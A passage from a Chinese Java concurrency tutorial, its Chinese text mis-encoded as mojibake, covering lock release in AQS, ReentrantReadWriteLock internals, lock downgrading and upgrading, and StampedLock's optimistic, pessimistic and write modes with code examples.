        CASè·å–é”;  <span class="hljs-comment">// ä¸æ£€æŸ¥é˜Ÿåˆ—ï¼Œç›´æ¥å°è¯•</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>/<span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// å¯é‡å…¥å¤„ç†...</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>å…³é”®ï¼šå…ˆç›´æ¥CASå°è¯•è·å–é”</strong>ï¼ˆå¯èƒ½æ’é˜Ÿï¼‰</li>
<li>å¤±è´¥æ‰è°ƒç”¨acquireï¼Œè¿›å…¥é˜Ÿåˆ—</li>
<li>åœ¨é˜Ÿåˆ—ä¸­ä¹Ÿç›´æ¥å°è¯•è·å–ï¼Œä¸æ£€æŸ¥æ˜¯å¦è½®åˆ°</li>
</ol>
<h4 data-id="heading-169">é”çš„é‡Šæ”¾æµç¨‹</h4>
<p><strong>é‡Šæ”¾æµç¨‹ï¼ˆå…¬å¹³é”å’Œéå…¬å¹³é”ç›¸åŒï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java">unlock() {
    release(<span class="hljs-number">1</span>);  <span class="hljs-comment">// è°ƒç”¨AQSçš„release</span>
}

release(<span class="hljs-number">1</span>) {
    <span class="hljs-keyword">if</span> (tryRelease(<span class="hljs-number">1</span>)) {  <span class="hljs-comment">// å°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-keyword">if</span> (é˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹) {
            å”¤é†’ä¸‹ä¸€ä¸ªç­‰å¾…çš„çº¿ç¨‹;  <span class="hljs-comment">// è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</span>
        }
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// è¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼Œæœªå®Œå…¨é‡Šæ”¾</span>
}
</code></pre>
<p><strong>æµç¨‹æ€»ç»“ï¼š</strong></p>
<ol>
<li>stateå‡1</li>
<li>å¦‚æœstateå˜ä¸º0ï¼Œå®Œå…¨é‡Šæ”¾é”</li>
<li>å”¤é†’é˜Ÿåˆ—ä¸­ç­‰å¾…çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹</li>
<li>è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</li>
</ol>
<hr/>
<h2 data-id="heading-170">ç¬¬å…«ç«  è¯»å†™é”ï¼ˆReadWriteLockï¼‰</h2>
<h3 data-id="heading-171">8.1 ReadWriteLockæ¥å£</h3>
<h4 data-id="heading-172">è¯»å†™é”çš„è®¾è®¡æ€æƒ³</h4>
<p><strong>ReadWriteLock</strong>æä¾›äº†ä¸¤ç§é”ï¼š</p>
<ul>
<li><strong>è¯»é”ï¼ˆReadLockï¼‰</strong>ï¼šå…±äº«é”ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li><strong>å†™é”ï¼ˆWriteLockï¼‰</strong>ï¼šç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰</li>
</ul>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong></p>
<ul>
<li>è¯»æ“ä½œå¤šã€å†™æ“ä½œå°‘çš„åœºæ™¯</li>
<li>æé«˜å¹¶å‘æ€§èƒ½</li>
<li>è¯»æ“ä½œä¸äº’æ–¥ï¼Œå†™æ“ä½œäº’æ–¥</li>
</ul>
<h4 data-id="heading-173">è¯»é”ä¸å†™é”çš„å…³ç³»</h4>
<p><strong>é”çš„å…¼å®¹æ€§ï¼š</strong></p>

























<table><thead><tr><th>å½“å‰é”çŠ¶æ€</th><th>è¯»é”</th><th>å†™é”</th></tr></thead><tbody><tr><td><strong>æ— é”</strong></td><td>âœ… å¯ä»¥è·å–</td><td>âœ… å¯ä»¥è·å–</td></tr><tr><td><strong>è¯»é”</strong></td><td>âœ… å¯ä»¥è·å–ï¼ˆå¤šä¸ªè¯»é”å…±äº«ï¼‰</td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…è¯»é”é‡Šæ”¾ï¼‰</td></tr><tr><td><strong>å†™é”</strong></td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…å†™é”é‡Šæ”¾ï¼‰</td><td>âŒ ä¸èƒ½è·å–ï¼ˆç­‰å¾…å†™é”é‡Šæ”¾ï¼‰</td></tr></tbody></table>
<p><strong>è§„åˆ™ï¼š</strong></p>
<ul>
<li>å¤šä¸ªè¯»é”å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li>è¯»é”å’Œå†™é”äº’æ–¥</li>
<li>å†™é”å’Œå†™é”äº’æ–¥</li>
</ul>
<h3 data-id="heading-174">8.2 ReentrantReadWriteLock</h3>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li><strong>è¯»é”ï¼ˆReadLockï¼‰</strong>ï¼šå…±äº«é”ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰ï¼ˆç±»ä¼¼å¤šäººåŒæ—¶çœ‹ä¹¦ï¼‰</li>
<li><strong>å†™é”ï¼ˆWriteLockï¼‰</strong>ï¼šç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰ï¼ˆç±»ä¼¼ä¸€äººç‹¬å å†™ä½œï¼‰</li>
</ul>
<h4 data-id="heading-175">è¯»é”çš„å…±äº«æ€§</h4>
<p><strong>è¯»é”åŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ï¼Œå…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è¯»å–ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();

<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–è¯»é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æ‰§è¡Œè¿™é‡Œ</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰è¯»é”</li>
<li>âœ… è¯»é”æ˜¯å¯é‡å…¥çš„</li>
<li>âŒ è¯»é”ä¼šé˜»å¡å†™é”çš„è·å–ï¼ˆæœ‰è¯»é”æ—¶ä¸èƒ½è·å–å†™é”ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> è¯»å¤šå†™å°‘çš„åœºæ™¯ï¼Œå¦‚ç¼“å­˜ã€é…ç½®è¯»å–</p>
<h4 data-id="heading-176">å†™é”çš„æ’ä»–æ€§</h4>
<p><strong>å†™é”åŸºäºAQSçš„ç‹¬å æ¨¡å¼å®ç°ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å†™å…¥ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();

<span class="hljs-comment">// åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–å†™é”</span>
writeLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å†™å…¥æ•°æ®ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œè¿™é‡Œ</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();
}
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰å†™é”</li>
<li>âŒ å†™é”ä¼šé˜»å¡æ‰€æœ‰è¯»é”å’Œå†™é”</li>
<li>âœ… å†™é”æ˜¯å¯é‡å…¥çš„</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong> æ•°æ®å†™å…¥ã€æ›´æ–°æ“ä½œ</p>
<h4 data-id="heading-177">é”é™çº§ï¼ˆå†™é”â†’è¯»é”ï¼‰</h4>
<p><strong>é”é™çº§ï¼š</strong> å°†å†™é”é™çº§ä¸ºè¯»é”ï¼ˆ<strong>æ”¯æŒ</strong>ï¼‰</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹ï¼Œå…ˆè·å–è¯»é”ï¼Œå†é‡Šæ”¾å†™é”</li>
<li>è¿™æ ·å¯ä»¥ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼ŒåŒæ—¶å…è®¸å…¶ä»–çº¿ç¨‹è¯»å–</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
<span class="hljs-type">ReadLock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
<span class="hljs-type">WriteLock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();

writeLock.lock();  <span class="hljs-comment">// 1. å…ˆè·å–å†™é”</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ›´æ–°æ•°æ®</span>
    readLock.lock();  <span class="hljs-comment">// 2. åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹è·å–è¯»é”</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();  <span class="hljs-comment">// 3. é‡Šæ”¾å†™é”ï¼ˆæ­¤æ—¶è¿˜æŒæœ‰è¯»é”ï¼‰</span>
}

<span class="hljs-comment">// ç°åœ¨æŒæœ‰è¯»é”ï¼Œå¯ä»¥è¯»å–æ•°æ®</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();  <span class="hljs-comment">// 4. é‡Šæ”¾è¯»é”</span>
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p>
<ul>
<li>âš ï¸ <strong>å¿…é¡»åœ¨æŒæœ‰å†™é”çš„æƒ…å†µä¸‹è·å–è¯»é”</strong></li>
<li>âš ï¸ <strong>å…ˆè·å–è¯»é”ï¼Œå†é‡Šæ”¾å†™é”</strong>ï¼ˆé¡ºåºå¾ˆé‡è¦ï¼‰</li>
<li>âŒ <strong>ä¸èƒ½å…ˆé‡Šæ”¾å†™é”ï¼Œå†è·å–è¯»é”</strong>ï¼ˆä¸­é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹è·å–å†™é”ï¼‰</li>
</ul>
<h4 data-id="heading-178">é”å‡çº§ï¼ˆè¯»é”â†’å†™é”ï¼‰</h4>
<p><strong>é”å‡çº§ï¼š</strong> å°†è¯»é”å‡çº§ä¸ºå†™é”ï¼ˆ<strong>ä¸æ”¯æŒ</strong>ï¼‰</p>
<p><strong>ç†è§£è¦ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸èƒ½åœ¨æŒæœ‰è¯»é”çš„æƒ…å†µä¸‹ç›´æ¥è·å–å†™é”</li>
<li>ä¼šå¯¼è‡´æ­»é”ï¼šå†™é”ç­‰å¾…è¯»é”é‡Šæ”¾ï¼Œä½†è¯»é”ä¸ä¼šé‡Šæ”¾</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¼šå¯¼è‡´æ­»é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    writeLock.lock();  <span class="hljs-comment">// ä¼šä¸€ç›´é˜»å¡ï¼Œå› ä¸ºè¿˜åœ¨æŒæœ‰è¯»é”</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šå…ˆé‡Šæ”¾è¯»é”ï¼Œå†è·å–å†™é”</span>
readLock.lock();
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è¯»å–æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    readLock.unlock();  <span class="hljs-comment">// å…ˆé‡Šæ”¾è¯»é”</span>
}

writeLock.lock();  <span class="hljs-comment">// å†è·å–å†™é”</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// å†™å…¥æ•°æ®</span>
} <span class="hljs-keyword">finally</span> {
    writeLock.unlock();
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½å‡çº§ï¼š</strong></p>
<ul>
<li>å¦‚æœå¤šä¸ªçº¿ç¨‹éƒ½æŒæœ‰è¯»é”ï¼Œéƒ½å°è¯•å‡çº§ä¸ºå†™é”</li>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…å…¶ä»–çº¿ç¨‹é‡Šæ”¾è¯»é”</li>
<li>å½¢æˆæ­»é”ï¼šæ‰€æœ‰çº¿ç¨‹éƒ½åœ¨ç­‰å¾…ï¼Œä½†è°ä¹Ÿä¸é‡Šæ”¾</li>
</ul>
<h3 data-id="heading-179">8.3 ReentrantReadWriteLockçš„å®ç°</h3>
<h4 data-id="heading-180">é«˜16ä½å­˜å‚¨è¯»é”çŠ¶æ€</h4>
<p><strong>stateçš„æ‹†åˆ†ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SHARED_SHIFT</span>   <span class="hljs-operator">=</span> <span class="hljs-number">16</span>;
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SHARED_UNIT</span>    <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT);
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MAX_COUNT</span>      <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="hljs-number">1</span>;
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">EXCLUSIVE_MASK</span> <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; SHARED_SHIFT) - <span class="hljs-number">1</span>;

<span class="hljs-comment">// è·å–è¯»é”æ•°é‡ï¼ˆé«˜16ä½ï¼‰</span>
<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">sharedCount</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> { <span class="hljs-keyword">return</span> c &gt;&gt;&gt; SHARED_SHIFT; }

<span class="hljs-comment">// è·å–å†™é”æ•°é‡ï¼ˆä½16ä½ï¼‰</span>
<span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">exclusiveCount</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span> { <span class="hljs-keyword">return</span> c &amp; EXCLUSIVE_MASK; }
</code></pre>
<p><strong>stateç»“æ„ï¼š</strong></p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">state</span> (<span class="hljs-number">32</span>ä½)
â”œâ”€â”€ é«˜<span class="hljs-number">16</span>ä½ï¼šè¯»é”è®¡æ•°ï¼ˆæœ€å¤š<span class="hljs-number">65535</span>ä¸ªè¯»é”ï¼‰
â””â”€â”€ ä½<span class="hljs-number">16</span>ä½ï¼šå†™é”è®¡æ•°ï¼ˆé‡å…¥æ¬¡æ•°ï¼‰
</code></pre>
<h4 data-id="heading-181">ä½16ä½å­˜å‚¨å†™é”çŠ¶æ€</h4>
<p><strong>å†™é”çš„è·å–ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    <span class="hljs-type">int</span> <span class="hljs-variable">w</span> <span class="hljs-operator">=</span> exclusiveCount(c); <span class="hljs-comment">// è·å–å†™é”è®¡æ•°</span>
    
    <span class="hljs-keyword">if</span> (c != <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// æœ‰è¯»é”æˆ–å…¶ä»–çº¿ç¨‹æŒæœ‰å†™é”</span>
        <span class="hljs-keyword">if</span> (w == <span class="hljs-number">0</span> || current != getExclusiveOwnerThread())
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        
        <span class="hljs-comment">// å¯é‡å…¥</span>
        <span class="hljs-keyword">if</span> (w + exclusiveCount(acquires) &gt; MAX_COUNT)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(c + acquires);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-comment">// å°è¯•è·å–å†™é”</span>
    <span class="hljs-keyword">if</span> (writerShouldBlock() || !compareAndSetState(c, c + acquires))
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    
    setExclusiveOwnerThread(current);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
<h4 data-id="heading-182">è¯»é”çš„è·å–å’Œé‡Šæ”¾</h4>
<p><strong>è¯»é”çš„è·å–ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> unused)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-comment">// å¦‚æœæœ‰å†™é”ä¸”ä¸æ˜¯å½“å‰çº¿ç¨‹æŒæœ‰ï¼Œå¤±è´¥</span>
    <span class="hljs-keyword">if</span> (exclusiveCount(c) != <span class="hljs-number">0</span> &amp;&amp; getExclusiveOwnerThread() != current)
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;
    
    <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> sharedCount(c); <span class="hljs-comment">// è¯»é”è®¡æ•°</span>
    <span class="hljs-keyword">if</span> (!readerShouldBlock() &amp;&amp; r &lt; MAX_COUNT &amp;&amp;
        compareAndSetState(c, c + SHARED_UNIT)) {
        <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–è¯»é”</span>
        <span class="hljs-keyword">if</span> (r == <span class="hljs-number">0</span>) {
            firstReader = current;
            firstReaderHoldCount = <span class="hljs-number">1</span>;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (firstReader == current) {
            firstReaderHoldCount++;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ä½¿ç”¨ThreadLocalå­˜å‚¨æ¯ä¸ªçº¿ç¨‹çš„è¯»é”è®¡æ•°</span>
            <span class="hljs-type">HoldCounter</span> <span class="hljs-variable">rh</span> <span class="hljs-operator">=</span> cachedHoldCounter;
            <span class="hljs-keyword">if</span> (rh == <span class="hljs-literal">null</span> || rh.tid != getThreadId(current))
                cachedHoldCounter = rh = readHolds.get();
            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rh.count == <span class="hljs-number">0</span>)
                readHolds.set(rh);
            rh.count++;
        }
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
    }
    <span class="hljs-keyword">return</span> fullTryAcquireShared(current);
}
</code></pre>
<p><strong>è¯»é”çš„é‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> unused)</span> {
    <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    
    <span class="hljs-keyword">if</span> (firstReader == current) {
        <span class="hljs-keyword">if</span> (firstReaderHoldCount == <span class="hljs-number">1</span>)
            firstReader = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">else</span>
            firstReaderHoldCount--;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-type">HoldCounter</span> <span class="hljs-variable">rh</span> <span class="hljs-operator">=</span> cachedHoldCounter;
        <span class="hljs-keyword">if</span> (rh == <span class="hljs-literal">null</span> || rh.tid != getThreadId(current))
            rh = readHolds.get();
        <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> rh.count;
        <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">1</span>) {
            readHolds.remove();
            <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)
                <span class="hljs-keyword">throw</span> unmatchedUnlockException();
        }
        --rh.count;
    }
    
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c - SHARED_UNIT;
        <span class="hljs-keyword">if</span> (compareAndSetState(c, nextc))
            <span class="hljs-keyword">return</span> nextc == <span class="hljs-number">0</span>;
    }
}
</code></pre>
<h4 data-id="heading-183">å†™é”çš„è·å–å’Œé‡Šæ”¾</h4>
<p><strong>å†™é”çš„è·å–ï¼š</strong> è§ä¸Šé¢çš„tryAcquireæ–¹æ³•</p>
<p><strong>å†™é”çš„é‡Šæ”¾ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-keyword">if</span> (!isHeldExclusively())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> getState() - releases;
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> exclusiveCount(nextc) == <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (free)
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    setState(nextc);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<h3 data-id="heading-184">8.4 StampedLock</h3>
<h4 data-id="heading-185">StampedLockçš„ç‰¹ç‚¹</h4>
<p><strong>StampedLock</strong>æ˜¯JDK 8å¼•å…¥çš„æ–°é”ï¼Œæä¾›äº†ä¸‰ç§æ¨¡å¼ï¼š</p>
<ol>
<li><strong>å†™é”ï¼ˆWritingï¼‰</strong>ï¼šç‹¬å é”ï¼Œç±»ä¼¼ReentrantReadWriteLockçš„å†™é”</li>
<li><strong>æ‚²è§‚è¯»é”ï¼ˆReadingï¼‰</strong>ï¼šå…±äº«é”ï¼Œç±»ä¼¼ReentrantReadWriteLockçš„è¯»é”</li>
<li><strong>ä¹è§‚è¯»é”ï¼ˆOptimistic Readingï¼‰</strong>ï¼šä¸é˜»å¡ï¼Œé€šè¿‡éªŒè¯æˆ³è®°æ¥æ£€æŸ¥æ•°æ®æ˜¯å¦è¢«ä¿®æ”¹</li>
</ol>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸æ”¯æŒé‡å…¥</li>
<li>ä¸æ”¯æŒCondition</li>
<li>æ€§èƒ½ä¼˜äºReentrantReadWriteLockï¼ˆç‰¹åˆ«æ˜¯åœ¨è¯»å¤šå†™å°‘çš„åœºæ™¯ï¼‰</li>
</ul>
<h4 data-id="heading-186">ä¹è§‚è¯»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.concurrent.locks.StampedLock;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StampedLockExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> x, y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">distanceFromOrigin</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. å°è¯•ä¹è§‚è¯»</span>
        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.tryOptimisticRead();
        <span class="hljs-type">double</span> <span class="hljs-variable">curX</span> <span class="hljs-operator">=</span> x, curY = y;
        
        <span class="hljs-comment">// 2. éªŒè¯æˆ³è®°æ˜¯å¦æœ‰æ•ˆï¼ˆæ£€æŸ¥æ˜¯å¦æœ‰å†™æ“ä½œï¼‰</span>
        <span class="hljs-keyword">if</span> (!lock.validate(stamp)) {
            <span class="hljs-comment">// 3. æˆ³è®°æ— æ•ˆï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»é”</span>
            stamp = lock.readLock();
            <span class="hljs-keyword">try</span> {
                curX = x;
                curY = y;
            } <span class="hljs-keyword">finally</span> {
                lock.unlockRead(stamp);
            }
        }
        
        <span class="hljs-keyword">return</span> Math.sqrt(curX * curX + curY * curY);
    }
}
</code></pre>
<p><strong>ä¹è§‚è¯»çš„æµç¨‹ï¼š</strong></p>
<ol>
<li><code>tryOptimisticRead()</code>ï¼šè·å–ä¹è§‚è¯»æˆ³è®°ï¼Œä¸é˜»å¡</li>
<li>è¯»å–æ•°æ®</li>
<li><code>validate(stamp)</code>ï¼šéªŒè¯æˆ³è®°æ˜¯å¦æœ‰æ•ˆ
<ul>
<li>æœ‰æ•ˆï¼šè¯´æ˜æ²¡æœ‰å†™æ“ä½œï¼Œè¯»å–æˆåŠŸ</li>
<li>æ— æ•ˆï¼šè¯´æ˜æœ‰å†™æ“ä½œï¼Œå‡çº§ä¸ºæ‚²è§‚è¯»é”</li>
</ul>
</li>
</ol>
<h4 data-id="heading-187">æ‚²è§‚è¯»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// è·å–æ‚²è§‚è¯»é”</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.readLock();
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> x + y;
    } <span class="hljs-keyword">finally</span> {
        lock.unlockRead(stamp);
    }
}
</code></pre>
<p><strong>æ‚²è§‚è¯»é”ï¼š</strong></p>
<ul>
<li>ç±»ä¼¼ReentrantReadWriteLockçš„è¯»é”</li>
<li>å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰</li>
<li>ä¸å†™é”äº’æ–¥</li>
</ul>
<h4 data-id="heading-188">å†™é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">double</span> deltaX, <span class="hljs-type">double</span> deltaY)</span> {
    <span class="hljs-comment">// è·å–å†™é”</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> lock.writeLock();
    <span class="hljs-keyword">try</span> {
        x += deltaX;
        y += deltaY;
    } <span class="hljs-keyword">finally</span> {
        lock.unlockWrite(stamp);
    }
}
</code></pre>
<p><strong>å†™é”ï¼š</strong></p>
<ul>
<li>ç‹¬å é”ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½æŒæœ‰</li>
<li>ä¸è¯»é”å’Œå†™é”éƒ½äº’æ–¥</li>
</ul>
<h4 data-id="heading-189">æ€§èƒ½å¯¹æ¯”</h4>
<p><strong>æ€§èƒ½æµ‹è¯•ï¼š</strong></p>
